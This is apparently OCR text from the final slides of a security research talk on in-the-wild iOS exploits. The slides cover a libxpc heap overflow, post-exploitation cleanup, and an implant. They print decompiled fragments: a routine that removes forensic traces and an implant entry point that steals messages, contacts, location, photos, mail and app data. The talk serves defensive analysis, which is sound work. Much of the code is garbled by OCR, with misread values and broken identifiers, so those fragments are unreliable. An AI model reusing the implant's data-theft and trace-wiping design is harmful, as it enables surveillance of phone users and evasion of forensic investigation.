build-your-own-bug with virtual memory issues
In 2017 lokihardt found CVE-2017-2456, a similar style of issue involving out-of-line descriptors being
backed by shared memory. He found that this could be turned into a heap overflow in libxpc when it parses
an XPC dictionary. Specifically, libxpc will call strlen on a buffer in the now-shared memory, use that length
plus one to allocate a buffer, then call strcpy to fill the buffer. The strcpy will copy until it finds a NULL
byte, unaware of the size of the destination buffer.
v5 = *(_QWORD *)target_address;
vm_deallocate((vm_map_t) (unsigned int)mach_task_self_, target_address, Ox4QQ0Q0uLL) ;
break;
```

## Slide 53

Post-exploitation What’s happening after the exploits?

53

## Slide 54

# Cleaning up

54

## Slide 55

55


> Recovered by OCR — confidence 89/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
280
281
282
283
284
285
286
287
288
289
290
291
292
293
294
a
if ( (unsi
safe_abo
v67 = file
v68 = Rema
v69 = Remo
v70 = Remo
safe_abo
v76 = v69;
v77 v68;
v74 OLL;
Removes the file or directory at the specified path.
iOS 2.0+ | iPadOS 2.0+ | Mac Catalyst 13.1+ | macOS 10.5+ | tvOS 9.0+ | visionOS 1.0+ | watchOS 2.0+
- (BOOL)removeItemAtPath:(NSString *)path
error:(NSError * _Nullable *)error;
if ( (unsigned waa v70, & src, 3u, &v74, lu) )
RemoteProcessExecCtx: :removeFiles(files_to_remove, number_of_files);
DCB "tuscache.plist",0
; DATA XREF:
aVarMobileLibra_3 DCB "/var/mobile/Library/Preferences/com.apple.identityservices.idsta"
pwnCitizenLab(RemoteProcessExecCtx *
aVarMobileLibra_4 DCB "/var/mobile/Library/FrontBoard/applicationState.db",0
55
```

## Slide 56

Implant

56

## Slide 57

57


> Recovered by OCR — confidence 91/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
__int64 (18; // [xspt+18h] [xbp+8
pwnCitizenLab(rproc,
pwnAppList(rproc, 1);
pwnCitizenLab(rproc, 1);
pwnDeviceInfo(rproc, 1);
pwnCitizenLab(rproc, 1);
pwnLocationDbs(rproc, 1);
pwnCitizenLab(rproc, 1);
1);
pwnStockApps(rproc, 1);
pwnCitizenLab(rproc, 1);
pwnContainers(rproc, 1);
pwnCitizenLab(rproc, 1);
pwnThumbnails(rproc, 1);
pwnCitizenLab(rproc, 1);
pwnWifiInfo(rproc, 1);
pwnCitizenLab(rproc, 1);
pwnLessPriorityContainers(rproc,
pwnCitizenLab(rproc, 1);
pwnStockMailApp(rproc, 1);
pwnCitizenLab(rproc, 1);
pwnTtwitterDB(rproc, 1);
__ break (0xC471u) ;
return pwnCitizenLab(rproc, 1);
1);
__fastcall AgentEntry (RemoteProcessExecCtx
//
//
//
//
//
//
//
//
//
//
//
*rproc)
remove forensics traces
List all apps
Device info
GPS
Data from stock apps (e.g. iMessages)
SMS, call history, contacts
All photos as thumbnails
Wifi info
less important db
emails
twitter
a
```

## Slide 58

More or more challenging.

58


> Recovered by OCR — confidence 92/100 on the text kept, 92/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
Number of message apps on mobile phones ea
250
200
150
Number
100
0
1995 2000 2005 2010 2015 2020
Year
58
```

## Slide 59

# Future

59

## Slide 60

All bugs will matter

60

## Slide 61

# Browsers Messaging apps 0-click and 1-click

61

## Slide 62

62


> Recovered by OCR — confidence 89/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
hax$ unzip ~/Downloads/com.tencent.mm.apk 2>&1 > /dev/null
hax$ strings lLib/armeabi-v7a/1libx
Llibx.pipeline.so libxeffect_xlog.so libxffmpeg.so
hax$ strings lib/armeabi-v7a/lLibxffmpeg.so | grep FFmpeg
FFmpeg v%d.%d.%d / Libavcodec build: %d
https protocol not found, recompile FFmpeg with openssl, gnu
Not yet implemented in FFmpeg, patches welcome
is not implemented. Update your FFmpeg version to the newes
has not been im ted. |
n4.
?FFmpeg version .3-371-gf3dessen36
FFmpeg version n4.1.3-371-gf3de33eb38.0.unknown
62
```

## Slide 63

63


> Recovered by OCR — confidence 93/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
The future isnt ahead of us.
It has already happened.
63
```

## Slide 64

Stay safe _0day-in-the-wild@google.com_

64
